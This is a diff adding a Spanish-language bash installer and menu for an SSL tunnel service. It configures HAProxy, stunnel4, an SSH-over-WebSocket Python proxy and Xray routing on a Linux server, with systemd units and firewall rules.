+echo -e " Dominio     : ${SERVER_DOMAIN:-NO CONFIGURADO}"
+echo -e "$(trx ' Puertos     : 80, 443, 8080, 8443, 445, 844, 444')"
+echo -e "$(trx ' Servicio    : HAProxy + stunnel4')"
+echo -e "$(trx ' Backend     : SSH WebSocket + Xray')"
+echo -e "$(trx ' Certificado : Auto Firmado (SAN wildcard)')"
+echo -e "$(trx ' Auto-Sign   : /usr/local/bin/auto-sign-domain')"
+
+echo ""
+
+if systemctl is-active --quiet haproxy; then
+    LBL=("Reinstalar SSL Tunnel" "Reiniciar Servicios" "Ver Estado" "Desinstalar SSL Tunnel")
+else
+    LBL=("Instalar SSL Tunnel")
+fi
+SEL=$(nav_pick "► Opción:" "${LBL[@]}" "↩ Regresar") || SEL=0
+[[ $SEL -eq $((${#LBL[@]}+1)) ]] && SEL=0
+opc="$SEL"
+
+case "$opc" in
+
+1)
+clear
+mv_brand_header "INSTALANDO SSL TUNNEL"
+install_ssl_tunnel
+
+sleep 3
+;;
+
+2)
+
+if systemctl is-active --quiet haproxy; then
+    restart_ssl_tunnel
+else
+    echo "$(trx '❌ SSL Tunnel no está instalado.')"
+    sleep 3
+fi
+
+;;
+
+3)
+
+clear
+echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+echo "$(trx '        ESTADO DEL SERVICIO')"
+echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+echo
+
+ssl_tunnel_status
+
+echo
+read -n1 -r -p "$(trx 'Presione una tecla para continuar...')"
+;;
+
+4)
+
+if systemctl is-active --quiet haproxy; then
+    remove_ssl_tunnel
+    sleep 3
+else
+    echo "$(trx '❌ SSL Tunnel no está instalado.')"
+    sleep 3
+fi
+
+;;
+
+0)
+
+exec bash "$BASE/protocolos/menu.sh"
+
+;;
+
+*)
+
+echo
+echo "$(trx '❌ Opción inválida.')"
+sleep 2
+;;
+
+esac
+
+done
+
+}
+create_haproxy_config() {
+
+cat >/etc/haproxy/haproxy.cfg <<'EOF'
+global
+    stats socket /run/haproxy/admin.sock mode 660 level admin expose-fd listeners
+    stats timeout 1d
+
+    tune.bufsize 1048576
+    tune.maxrewrite 3072
+    tune.ssl.default-dh-param 2048
+
+    pidfile /run/haproxy.pid
+    chroot /var/lib/haproxy
+
+    user haproxy
+    group haproxy
+    daemon
+
+    ssl-default-bind-ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384
+
+    ssl-default-bind-ciphersuites TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256
+
+    ssl-default-bind-options no-sslv3 no-tlsv10 no-tlsv11
+
+    ca-base /etc/ssl/certs
+    crt-base /etc/ssl/private
+
+defaults
+    log global
+    mode tcp
+    option dontlognull
+    option tcp-smart-connect
+
+    timeout connect 5s
+    timeout client 24h
+    timeout server 24h
+
+frontend multiport_frontend
+    mode tcp
+
+    bind *:443 tfo
+
+    tcp-request inspect-delay 10ms
+    tcp-request content accept if HTTP
+    tcp-request content accept if { req.ssl_hello_type 1 }
+
+    use_backend recir_http_backend if HTTP
+    default_backend recir_https_backend
+
+backend recir_https_backend
+    mode tcp
+
+    server recir_https_server abns@haproxy-https send-proxy-v2 check
+
+backend recir_http_backend
+    mode tcp
+
+    server recir_http_server abns@haproxy-http send-proxy-v2 check
+
+frontend multiports_frontend
+    mode tcp
+
+    bind abns@haproxy-http accept-proxy tfo
+
+    default_backend recir_https_www_backend
+
+backend recir_https_www_backend
+    mode tcp
+
+    server recir_https_www_server 127.0.0.1:2223 check
+
+frontend ssl_frontend
+
+    mode tcp
+
+    bind *:80 tfo
+    bind *:8080 tfo
+    bind *:8443 ssl crt /etc/haproxy/yha.pem alpn h2,http/1.1 tfo
+
+    bind abns@haproxy-https accept-proxy ssl crt /etc/haproxy/yha.pem alpn h2,http/1.1 tfo
+
+    tcp-request inspect-delay 200ms
+
+    tcp-request content capture req.ssl_sni len 100
+
+    tcp-request content accept if { req.ssl_hello_type 1 }
+    acl acl_upgrade hdr(Connection) -i upgrade
+    acl acl_websocket hdr(Upgrade) -i websocket
+
+    acl acl_payload payload(0,7) -m bin 5353482d322e30
+
+    acl acl_http2 ssl_fc_alpn -i h2
+
+    acl acl_path_regex path_reg -i ^\/(.*)
+    acl acl_path_vless path_reg -i ^\/vless.*
+    acl acl_path_vmess path_reg -i ^\/vmess.*
+    acl acl_path_trojan path_reg -i ^\/trojan-ws.*
+    acl acl_path_grpc path_reg -i ^\/(vmess-grpc|trojan-grpc|ss-grpc).*
+    acl acl_path_ssh path_reg -i ^\/fightertunnelssh.*
+
+    use_backend grpc_backend if acl_http2
+
+    use_backend vmess_backend if acl_path_vmess
+    use_backend vmess_backend if acl_path_vless
+    use_backend vmess_backend if acl_path_trojan
+    use_backend vmess_backend if acl_path_grpc
+
+    use_backend ssh_backend if acl_path_ssh
+
+    use_backend websocket_backend if acl_upgrade acl_websocket
+
+    use_backend websocket_backend if acl_path_regex
+
+    use_backend bot_ftvpn_backend if acl_payload
+
+    default_backend ssh_ws_default_backend
+
+backend websocket_backend
+    mode tcp
+
+    server ssh_ws_server 127.0.0.1:10015 check
+
+backend grpc_backend
+    mode tcp
+
+    server grpc_server 127.0.0.1:10015 check
+
+backend ssh_ws_default_backend
+    mode tcp
+
+    server ssh_ws_server 127.0.0.1:10015 check
+
+backend bot_ftvpn_backend
+    mode tcp
+
+    server ssh_direct 127.0.0.1:22 check
+
+backend vmess_backend
+    mode tcp
+
+    server payload_server_vmess   127.0.0.1:10002 check
+
+backend ssh_backend
+    mode tcp
+
+    server ssh_server 127.0.0.1:10015 check
+
+EOF
+
+    if haproxy -c -f /etc/haproxy/haproxy.cfg >/dev/null 2>&1; then
+
+        msg_ok "Configuración HAProxy creada correctamente."
+
+    else
+
+        msg_error "La configuración contiene errores."
+
+        haproxy -c -f /etc/haproxy/haproxy.cfg
+
+        return 1
+
+    fi
+
+    systemctl daemon-reload
+
+    systemctl enable haproxy >/dev/null 2>&1
+
+    systemctl restart haproxy
+
+    if systemctl is-active --quiet haproxy; then
+
+        msg_ok "HAProxy iniciado correctamente."
+
+    else
+
+        msg_error "HAProxy no pudo iniciar."
+
+    fi
+
+}
+install_ssh_ws_internal() {
+
+cat > /usr/local/bin/ssh-ws-internal.py <<'PYEOF'
+#!/usr/bin/env python3
+
+import asyncio
+import signal
+import sys
+
+BUFFER_SIZE = 65536
+
+SSH_HOST = "127.0.0.1"
+SSH_PORT = 22
+
+RESPONSE_101 = (
+    b"HTTP/1.1 101 Switching Protocols\r\n"
+    b"Upgrade: websocket\r\n"
+    b"Connection: Upgrade\r\n\r\n"
+)
+
+RESPONSE_200 = (
+    b"HTTP/1.1 200 Connection established\r\n\r\n"
+)
+
+active = 0
+
+
+async def pipe(reader, writer):
+
+    try:
+
+        while True:
+
+            data = await reader.read(BUFFER_SIZE)
+
+            if not data:
+                break
+
+            writer.write(data)
+            await writer.drain()
+
+    except:
+
+        pass
+
+    finally:
+
+        try:
+            writer.close()
+        except:
+            pass
+
+
+async def handle(client_reader, client_writer):
+
+    global active
+
+    active += 1
+
+    ssh_writer = None
+
+    try:
+
+        try:
+
+            payload = await asyncio.wait_for(
+                client_reader.read(BUFFER_SIZE),
+                timeout=10
+            )
+
+        except asyncio.TimeoutError:
+
+            client_writer.close()
+
+            active -= 1
+
+            return
+
+        if not payload:
+
+            client_writer.close()
+
+            active -= 1
+
+            return
+
+        request = payload.decode(
+            "utf-8",
+            errors="ignore"
+        ).upper()
+
+        if "UPGRADE" in request or "WEBSOCKET" in request:
+
+            client_writer.write(RESPONSE_101)
+
+        else:
+
+            client_writer.write(RESPONSE_200)
+
+        await client_writer.drain()
+
+        try:
+
+            ssh_reader, ssh_writer = await asyncio.open_connection(
+                SSH_HOST,
+                SSH_PORT
+            )
+
+        except:
+
+            client_writer.close()
+
+            active -= 1
+
+            return
+
+        await asyncio.gather(
+
+            pipe(client_reader, ssh_writer),
+
+            pipe(ssh_reader, client_writer)
+
+        )
+
+    except:
+
+        pass
+    finally:
+
+        active -= 1
+
+        try:
+            client_writer.close()
+        except:
+            pass
+
+        if ssh_writer:
+
+            try:
+                ssh_writer.close()
+            except:
+                pass
+
+
+async def start(port):
+
+    server = await asyncio.start_server(
+        handle,
+        "127.0.0.1",
+        port
+    )
+
+    async with server:
+
+        await server.serve_forever()
+
+
+def main():
+
+    port = int(sys.argv[1]) if len(sys.argv) > 1 else 10015
+
+    loop = asyncio.new_event_loop()
+
+    asyncio.set_event_loop(loop)
+
+    for sig in (signal.SIGTERM, signal.SIGINT):
+
+        try:
+
+            loop.add_signal_handler(
+                sig,
+                lambda: loop.stop()
+            )
+
+        except:
+
+            pass
+
+    try:
+
+        loop.run_until_complete(start(port))
+
+    except KeyboardInterrupt:
+
+        pass
+
+    finally:
+
+        loop.close()
+
+
+if __name__ == "__main__":
+
+    main()
+
+PYEOF
+
+chmod +x /usr/local/bin/ssh-ws-internal.py
+
+cat >/etc/systemd/system/ssh-ws-internal.service <<EOF
+[Unit]
+Description=SSH WebSocket Proxy Internal
+After=network.target ssh.service sshd.service
+Wants=network.target
+
+[Service]
+Type=simple
+ExecStart=/usr/bin/python3 /usr/local/bin/ssh-ws-internal.py 10015
+Restart=always
+RestartSec=3
+StandardOutput=journal
+StandardError=journal
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+systemctl daemon-reload
+systemctl enable ssh-ws-internal.service >/dev/null 2>&1
+systemctl restart ssh-ws-internal.service
+
+if systemctl is-active --quiet ssh-ws-internal.service; then
+
+    msg_ok "SSH WebSocket Internal iniciado correctamente."
+
+else
+
+    msg_error "No fue posible iniciar SSH WebSocket Internal."
+
+fi
+
+}
+install_ssl_tunnel() {
+
+    line
+    msg_info "Iniciando instalación del SSL Tunnel..."
+    line
+
+    anim_init 6
+    anim_step "Instalando dependencias"
+    install_dependencies || return 1
+
+    anim_step "Abriendo puertos en firewall"
+    # Abrir puertos 80/443/8080/8443 + NAT (salida a internet)
+    if [[ -f "$BASE/herramientas/openports.sh" ]]; then
+        source "$BASE/herramientas/openports.sh"
+        open_ports "TCP:80,443,8080,8443"
+    else
+        sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1
+        for P in 80 443 8080 8443; do
+            iptables -C INPUT -p tcp --dport "$P" -j ACCEPT 2>/dev/null \
+                || iptables -A INPUT -p tcp --dport "$P" -j ACCEPT
+        done
+        DEV=$(ip -4 route show default | awk '{print $5}' | head -1)
+        [[ -n "$DEV" ]] && {
+            iptables -t nat -C POSTROUTING -o "$DEV" -j MASQUERADE 2>/dev/null \
+                || iptables -t nat -A POSTROUTING -o "$DEV" -j MASQUERADE
+        }
+    fi
+
+anim_step "Generando certificado SSL"
+generate_certificate || return 1
+
+install_xray_certs
+
+install_auto_sign
+
+kill_ports
+
+remove_old_ws
+
+anim_step "Instalando SSH WS Internal"
+install_ssh_ws_internal || return 1
+
+anim_step "Configurando HAProxy"
+create_haproxy_config || return 1
+
+ensure_haproxy_resilience
+
+install_stunnel4
+
+open_firewall_udp
+
+    if ! haproxy -c -f /etc/haproxy/haproxy.cfg >/dev/null 2>&1; then
+
+        msg_error "La configuración de HAProxy es inválida."
+
+        haproxy -c -f /etc/haproxy/haproxy.cfg
+
+        return 1
+
+    fi
+
+    anim_step "Arrancando HAProxy"
+    anim_run "daemon-reload" systemctl daemon-reload
+
+    systemctl enable haproxy >/dev/null 2>&1
+
+    if svc_restart_anim haproxy "Iniciando HAProxy"; then
+    
+# Actualizar configuración
+    grep -q "^SSL=" "$CONFIG" \
+    && sed -i 's/^SSL=.*/SSL=ON/' "$CONFIG" \
+    || echo "SSL=ON" >> "$CONFIG"
+
+grep -q "^SSL_TUNNEL=" "$CONFIG" \
+    && sed -i 's/^SSL_TUNNEL=.*/SSL_TUNNEL=ON/' "$CONFIG" \
+    || echo "SSL_TUNNEL=ON" >> "$CONFIG"
+    
+        msg_ok "HAProxy iniciado correctamente."
+
+    else
+
+        msg_error "No fue posible iniciar HAProxy."
+
+        return 1
+
+    fi
+
+    sleep 2
+
+    echo
+
+    line
+
+    if systemctl is-active --quiet haproxy; then
+        echo -e "${GREEN}HAProxy:${RESET} ACTIVO"
+    else
+        echo -e "${RED}HAProxy:${RESET} DETENIDO"
+    fi
+
+    if systemctl is-active --quiet ssh-ws-internal.service; then
+        echo -e "${GREEN}SSH WS Internal:${RESET} ACTIVO"
+    else
+        echo -e "${RED}SSH WS Internal:${RESET} DETENIDO"
+    fi
+
+    if systemctl is-active --quiet stunnel4; then
+        echo -e "${GREEN}stunnel4:${RESET} ACTIVO (445, 844, 444)"
+    else
+        echo -e "${RED}stunnel4:${RESET} DETENIDO"
+    fi
+
+    line
+
+    msg_ok "SSL Tunnel instalado correctamente."
+
+}
+ensure_haproxy_resilience() {
+
+    local DIR="/etc/systemd/system/haproxy.service.d"
+    local OVERRIDE="${DIR}/10-resilience.conf"
+
+    # Si ya existe el override, no volver a crearlo
+    if [[ -f "$OVERRIDE" ]]; then
+        return 0
+    fi
+
+    mkdir -p "$DIR"
+
+    cat > "$OVERRIDE" <<EOF
+[Unit]
+After=network-online.target ssh-ws-internal.service
+Wants=network-online.target ssh-ws-internal.service
+
+[Service]
+Restart=always
+RestartSec=3
+StartLimitIntervalSec=0
+ExecStartPre=/bin/mkdir -p /run/haproxy
+ExecStartPre=/bin/mkdir -p /var/lib/haproxy
+ExecStartPre=/bin/chown -R haproxy:haproxy /var/lib/haproxy /run/haproxy
+EOF
+
+    systemctl daemon-reload
+
+    msg_ok "Resiliencia de HAProxy configurada."
+
+}
+ensure_haproxy_running() {
+
+    # Verificar configuración
+    [[ -f /etc/haproxy/haproxy.cfg ]] || return
+    [[ -f /etc/haproxy/yha.pem ]] || return
+
+    # Recrear directorio del socket
+    mkdir -p /run/haproxy
+
+    # Aplicar resiliencia
+    ensure_haproxy_resilience
+
+    # Verificar servicio interno
+    if ! systemctl is-active --quiet ssh-ws-internal.service; then
+
+        if [[ -f /etc/systemd/system/ssh-ws-internal.service ]]; then
+
+            systemctl restart ssh-ws-internal.service >/dev/null 2>&1
+
+        else
+
+            install_ssh_ws_internal
+
+        fi
+
+    fi
+
+    # Verificar stunnel4
+    if ! systemctl is-active --quiet stunnel4; then
+        if [[ -f /etc/stunnel/stunnel.conf ]]; then
+            systemctl restart stunnel4 2>/dev/null
+        fi
+    fi
+
+    # Si HAProxy ya está activo no hacer nada
+    if systemctl is-active --quiet haproxy; then
+
+        return
+
+    fi
+
+    msg_info "Recuperando HAProxy..."
+
+    # Liberar puertos
+    fuser -k 80/tcp >/dev/null 2>&1 || true
+    fuser -k 443/tcp >/dev/null 2>&1 || true
+    fuser -k 8080/tcp >/dev/null 2>&1 || true
+    fuser -k 8443/tcp >/dev/null 2>&1 || true
+
+    systemctl restart haproxy >/dev/null 2>&1
+
+    sleep 2
+
+    if systemctl is-active --quiet haproxy; then
+
+        msg_ok "HAProxy recuperado correctamente."
+
+    else
+
+        msg_error "No fue posible iniciar HAProxy."
+
+    fi
+
+}
+#==================================================
+# INICIAR MENÚ
+#==================================================
+
+ssl_tunnel_menu
